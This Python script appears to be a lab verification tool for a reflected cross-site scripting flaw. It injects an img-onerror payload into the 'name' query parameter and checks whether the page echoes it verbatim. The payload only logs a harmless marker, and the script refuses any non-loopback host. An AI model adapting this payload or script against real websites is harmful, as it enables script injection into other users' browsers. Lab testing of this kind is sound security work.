#!/usr/bin/env python3
# XSS-003 final-wp4-v1 verification draft (manual adaptation required).
# Local lab only. Harmless marker: console.log('LLM_LAB_XSS').
# Submits GET ?name=<payload> and parses the "<pre>Hello ...</pre>" feedback
# region to show whether the payload is reflected verbatim. Browser execution
# must be observed manually: open the printed URL and check the console.
import argparse
import html
import ipaddress
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

PARAM = "name"  # GET parameter taken from the audited fragment
PAYLOAD = '<img src=x onerror="console.log(String.fromCharCode(76,76,77,95,76,65,66,95,88,83,83))">'


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def assert_local(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("refused: scheme must be http(s)")
    host = parts.hostname or ""
    if host == "localhost":
        return
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        raise SystemExit("refused: host %r is not localhost/IP" % host)
    if not ip.is_loopback:
        raise SystemExit("refused: %r is not loopback" % host)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True,
                    help="audited module URL, e.g. http://127.0.0.1/<lab-path>/")
    ap.add_argument("--cookie-file", default=None,
                    help="local file with Cookie header value; omit if no login")
    ap.add_argument("--timeout", type=float, default=10.0)
    args = ap.parse_args()

    assert_local(args.base_url)
    parts = urllib.parse.urlsplit(args.base_url)
    query = [(k, v) for k, v in urllib.parse.parse_qsl(parts.query, True)
             if k != PARAM]
    query.append((PARAM, PAYLOAD))
    target = urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path,
                                      urllib.parse.urlencode(query), ""))
    headers = {"User-Agent": "llm-lab-xss003-draft/1.0"}
    if args.cookie_file:
        with open(args.cookie_file, "r", encoding="utf-8") as fh:
            headers["Cookie"] = fh.read().strip()

    req = urllib.request.Request(target, headers=headers, method="GET")
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=args.timeout) as resp:
            status = resp.status
            ctype = resp.headers.get("Content-Type", "")
            body = resp.read().decode("utf-8", "replace")
            lower = {k.lower(): v for k, v in resp.headers.items()}
    except urllib.error.HTTPError as exc:
        print(json.dumps({"stage": "http", "error": "http_error",
                          "status": exc.code, "url": target}))
        return 2
    except (urllib.error.URLError, TimeoutError, ConnectionError) as exc:
        print(json.dumps({"stage": "connect", "error": str(exc),
                          "url": target}))
        return 3

    result = {"stage": "submitted", "url": target, "http_status": status,
              "content_type": ctype,
              "x_xss_protection": lower.get("x-xss-protection")}
    region = re.search(r"<pre>Hello (.*?)</pre>", body, re.S)
    if not region:
        result["feedback_region"] = "not found"
        result["interpretation"] = ("wrong path, failed auth or changed output; "
                                    "absence is not proof of safety")
    else:
        echoed = region.group(1)
        result["feedback_region"] = html.escape(echoed)[:300]
        result["payload_verbatim"] = PAYLOAD in echoed
        result["payload_html_escaped"] = html.escape(PAYLOAD) in echoed
        if PAYLOAD in echoed:
            result["interpretation"] = ("payload preserved verbatim; open URL "
                                        "in a browser and watch console")
        elif html.escape(PAYLOAD) in echoed:
            result["interpretation"] = "payload HTML-encoded; no execution expected"
        else:
            result["interpretation"] = "payload altered by filter/processing"
    print(json.dumps(result, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())